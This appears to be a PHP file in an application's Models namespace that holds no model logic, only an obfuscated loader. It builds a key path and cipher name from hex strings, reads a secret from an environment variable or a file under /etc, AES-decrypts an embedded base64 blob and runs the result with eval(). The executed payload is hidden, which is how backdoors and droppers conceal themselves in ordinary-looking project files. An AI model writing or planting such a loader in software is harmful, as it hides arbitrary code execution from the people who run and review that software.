<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Qw8Ks2mU5TsXpIMYDyxBcA==');

$c=base64_decode(

'YtQC8R6VDFRpeaeMGqQVaHUUO+UAbxvg72G4vg+swYw+9xB5LZnvVubE+Ft+5JMhu9r3CqKLDQyI' .
'fvKbxAVDB1zY9SHLtkwl930+tPIpz8nSiHRjniV0DiBrMf5qjq/XSTdqrRDbGCR/7b3bLR0EYwbM' .
'G78b9LmhkHSX1UU7Gd4PZxbD8HsOX1zQSElX9lN8PwuL4qsfucG7/ImsaN3RssFFMWQqj0VGsR6w' .
'SPf5EWVVroMCxLkqnpAqeCScWOyarfN5rV/lqdT/fFM/BGY+bfVvZrl5tMGmQINp5CPsquPIw9IE' .
'hrjwCFMFYXMVrmVongX3qaTHa8AfrlECEZuhKqfGoFuiSSoOUTcmtqazOWHqjUkkPCy+ZylJVudG' .
'w3Fd2iJWTsE9wQqM+mgVaeMzYDiY68KFIFpbcYLWFbjn41gZvuU92cxPJnbHJRpEssJonwMGZ+Q6' .
'TiTAqKxlrwESS/fl0TTfHNUnLwC9Mc0+FCiakBwEDCjgLJx7ZvpAFRtQB/eIVHA+kh/JwHSBURUD' .
'eiuJefjjsuCldRe/H4cKhxPXoK1Z0WuP5Ue+iP0iKmRDmSYJI2dt3TkXi3wU4gZ5Uh5ncSyUnxCG' .
'L/s2Nv07jxmfq/lqGsN/ci0dw/R2jRZHz2lCQJ5nWgnsHwKhkgEvIT86v4d9leC8bHGniVsbHGIz' .
'93cUF207AVKIAK2fk2KlxHyjqP2HdONSJ6VRP+2/pYCBE0Eok9dwF/S+ij+TXXO/KCyg78EYqFWY' .
'kcIdkBuHjKdZodAaUWKiapfOc45TgEGALiz5EPRytrBWxlCh2XUYUuzd1VxUnyp0Uz6TGlENak8V' .
'CWigR9FucyXWYcboSqwi9mnLYePEJgW4dLZwP97M5Cka7CQzC8cawXlad4XFLY2cCzgGUHRF0vSN' .
'BNMGqg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

